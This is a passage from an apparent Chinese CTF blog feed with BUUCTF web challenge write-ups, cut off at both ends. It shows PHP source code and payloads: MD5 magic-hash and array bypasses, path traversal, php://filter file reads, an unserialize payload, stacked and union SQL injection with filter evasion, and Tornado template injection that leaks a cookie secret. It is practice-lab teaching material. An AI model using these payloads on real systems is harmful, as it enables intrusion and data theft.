class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">aabg7XSs</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./23.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">levels91.php?a=QNKCDZO&amp;b=s878926199a</span><br><span class="line">也可以用数组绕过</span><br><span class="line">levels91.php?a[]=a&amp;b[]=b</span><br></pre></td></tr></table></figure><p>又到了新页面<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>依旧数组绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=a&amp;param2[]=b</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./24.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{b43ee0d2-4f80-4bcb-9674-7dc11e27bb3c}</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><a href="http://e1d2e78d-5eb7-4c10-88ca-b46fcfd7fba3.node3.buuoj.cn" target="_blank" rel="noopener">http://e1d2e78d-5eb7-4c10-88ca-b46fcfd7fba3.node3.buuoj.cn</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>$text里的file_get_contents()函数会把整个文件读入一个字符串中,即需要传入一个文件内容为”welcome to the zjctf”,采用php伪协议传输<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./25.png" alt="图片" title class>                <p>图片</p>            </figure><p>$file里可以include文件,但对flag做了过滤,同时注释了useless.php,利用php伪协议查看源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./26.png" alt="图片" title class>                <p>图片</p>            </figure><p>useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据index.php里password会序列化,在useless.php里进行反序列化<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>一并传入,查看源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./27.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{20a27159-4eb0-48e4-af80-c437443282a8}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;极客大挑战-2019-BabySQL&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-BabySQL&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]BabySQL&quot;&gt;&lt;/a&gt;[极客大挑战 2019]BabySQL&lt;/h2&gt;&lt;p&gt;&lt;a h
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF web练习2</title>
    <link href="https://www.damyahome.github.io/ctf-writeup-web/ckwd913b2001cpwucfng7tkhw/BUUCTF-web%E7%BB%83%E4%B9%A02/"/>
    <id>https://www.damyahome.github.io/ctf-writeup-web/ckwd913b2001cpwucfng7tkhw/BUUCTF-web%E7%BB%83%E4%B9%A02/</id>
    <published>2020-09-25T13:20:04.000Z</published>
    <updated>2020-09-25T13:22:09.933Z</updated>
    
    <content type="html"><![CDATA[<p>web题自然是想md形式,看着好看,奈何本地报错,pdf凑合看吧</p><p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="BUUCTF_web练习2.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;web题自然是想md形式,看着好看,奈何本地报错,pdf凑合看吧&lt;/p&gt;
&lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;BUUCTF_web练习2.pdf&quot; width=&quot;100%&quot; height
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>[MISC]拼图题小结</title>
    <link href="https://www.damyahome.github.io/ctf-writeup-misc/ckwd913cc0034pwucq6m75oto/MISC-%E6%8B%BC%E5%9B%BE%E9%A2%98%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.damyahome.github.io/ctf-writeup-misc/ckwd913cc0034pwucq6m75oto/MISC-%E6%8B%BC%E5%9B%BE%E9%A2%98%E5%B0%8F%E7%BB%93/</id>
    <published>2020-09-24T13:20:28.000Z</published>
    <updated>2020-09-24T13:23:21.529Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="[MISC]拼图题小结.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;[MISC]拼图题小结.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


&lt;
      
    
    </summary>
    
    
      <category term="ctf writeup misc" scheme="https://www.damyahome.github.io/categories/ctf-writeup-misc/"/>
    
    
      <category term="知识小结" scheme="https://www.damyahome.github.io/tags/%E7%9F%A5%E8%AF%86%E5%B0%8F%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>web for pentester 1 wp</title>
    <link href="https://www.damyahome.github.io/ctf-writeup-web/ckwd913dt0054pwucaqr91oji/web-for-pentester-1-wp/"/>
    <id>https://www.damyahome.github.io/ctf-writeup-web/ckwd913dt0054pwucaqr91oji/web-for-pentester-1-wp/</id>
    <published>2020-09-24T08:03:04.000Z</published>
    <updated>2020-09-24T08:05:32.238Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="web_for_pentester_1_wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;web_for_pentester_1_wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;

      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="靶场练习" scheme="https://www.damyahome.github.io/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_web练习1</title>
    <link href="https://www.damyahome.github.io/ctf-writeup-web/ckwd913b7001kpwuc2cyhtsd4/BUUCTF-web%E7%BB%83%E4%B9%A01/"/>
    <id>https://www.damyahome.github.io/ctf-writeup-web/ckwd913b7001kpwuc2cyhtsd4/BUUCTF-web%E7%BB%83%E4%B9%A01/</id>
    <published>2020-09-23T13:13:38.000Z</published>
    <updated>2020-09-23T13:45:38.330Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><a href="http://b76e95a3-a2ea-4205-a05c-bde04cd66b95.node3.buuoj.cn" target="_blank" rel="noopener">http://b76e95a3-a2ea-4205-a05c-bde04cd66b95.node3.buuoj.cn</a></p><p>查看源码看到提示source.php,访问之,得到源码,审计之</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//$whitelist变量只包含source.php和hint.php,isset函数检测变量是否声明,is_string函数检测变量是否为字符串,in_array函数检测数组中是否匹配$whitelist</span></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//mb_substr返回$page字符串从头开始,到mb_strpos查找?在$page中首次出现的位置的一段长度的字符,即如果$page有?,则截取?前的字符串</span></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//对$page进行解码,并再截取一遍</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"><span class="comment">//empty检查变量file是否为空,并is_string判断是否为字符串,并且要能访问,条件都满足就包含file传入的文件进行访问</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问hint.php试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?file=hint.php</span><br><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br><span class="line">/?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure></p><p>flag{3e11f910-1c51-453c-af9a-029edd269163}</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p><a href="http://d3003809-2d5c-4066-a9c6-9a706cb6e6d1.node3.buuoj.cn" target="_blank" rel="noopener">http://d3003809-2d5c-4066-a9c6-9a706cb6e6d1.node3.buuoj.cn</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1&apos; //报错,存在sql注入</span><br><span class="line">尝试select提示被过滤</span><br><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;show+databases;  //尝试堆叠注入查看数据库</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./3.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;show+tables+from+supersqli;  //查表</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./4.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;show+columns+from+`1919810931114514`;  //查列</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./5.png" alt="图片" title class>                <p>图片</p>            </figure><p>因为show最多只能查询到字段名,无法查询具体数据,所以还是需要绕过过滤,这里用的是预编译法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;use supersqli;set @sql=concat(&apos;s&apos;,&apos;elect `flag` from `1919810931114514`&apos;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;#</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./6.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{940f9932-6f3f-4507-a641-e91163cb4e03}</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p><a href="http://38f97425-069f-4ac7-a2de-960197db8f8b.node3.buuoj.cn" target="_blank" rel="noopener">http://38f97425-069f-4ac7-a2de-960197db8f8b.node3.buuoj.cn</a></p><p>尝试输入1,发现是post传参的注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query=1</span><br><span class="line">query=1;show databases;</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./7.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;show tables;</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./8.png" alt="图片" title class>                <p>图片</p>            </figure><p>而后发现from被过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=*,1  ==&gt;  select *,1 || flag from flag</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./9.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">官方解法</span><br><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br><span class="line">构造成</span><br><span class="line">select 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag FROM Flag</span><br><span class="line">其中PIPES_AS_CONCAT能将||视为字符串连接符而非或运算符</span><br><span class="line">实际运行为</span><br><span class="line">select 1;set sql_mode=PIPES_AS_CONCAT;select &quot;1&quot;+flag from Flag</span><br></pre></td></tr></table></figure><p>flag{22da20ee-17da-4f57-8a47-643580b0d03b}</p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><a href="http://5f70d406-086d-4640-a0c5-d08988a8f729.node3.buuoj.cn" target="_blank" rel="noopener">http://5f70d406-086d-4640-a0c5-d08988a8f729.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./10.png" alt="图片" title class>                <p>图片</p>            </figure><p>直接手注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=1&apos;and+&apos;1&apos;=&apos;2&apos;+union+select+1,2,&apos;3</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./11.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{9da954e2-3523-4bdb-8beb-77c5c4b905ac}</p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p><a href="http://dc831063-5096-4421-8cad-7d59def721a5.node3.buuoj.cn" target="_blank" rel="noopener">http://dc831063-5096-4421-8cad-7d59def721a5.node3.buuoj.cn</a></p><p>查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat=$_GET[&apos;cat&apos;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat==&apos;dog&apos;)&#123;</span><br><span class="line">echo &apos;Syc&#123;cat_cat_cat_cat&#125;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>根据提示传入参数使得cat=dog<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cat=dog</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./12.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{7d14e194-7772-4d41-8c61-fb1a0388b25e}</p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p><a href="http://6538e59c-7290-4314-876a-71896b2316fa.node3.buuoj.cn" target="_blank" rel="noopener">http://6538e59c-7290-4314-876a-71896b2316fa.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./13.png" alt="图片" title class>                <p>图片</p>            </figure><p>挨个访问得到信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/flag.txt&amp;filehash=4d81edafee08fa38738a59e9fd150d50</span><br><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line">/file?filename=/welcome.txt&amp;filehash=27f929d16f4606d46be11db34391a228</span><br><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line">/file?filename=/hints.txt&amp;filehash=bfc06735e011c9552a2fdb9f07e6dccc</span><br><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><p>根据规律需要构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(fllllllllllllag))</span><br></pre></td></tr></table></figure></p><p>先看看render,是个调用 res.render({options}) 去向模板中渲染数据, 可以把视图响应给客户端的渲染函数,尝试抓包访问fllllllllllllag文件<br><figure class="image-box">                <img src="./14.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>根据/error?msg=Error提示可以用error变量读取文件,查一下tornado里cookie_secret的位置</p><p><a href="https://www.tornadoweb.org/en/latest/guide/security.html" target="_blank" rel="noopener">https://www.tornadoweb.org/en/latest/guide/security.html</a>在handler/settings文件里</p><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./15.png" alt="图片" title class>                <p>图片</p>            </figure><p>cookie_secret:0a2781d2-6438-4103-8978-926c5e109fc8</p><p>接下来根据提示写个脚本加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">filename = <span 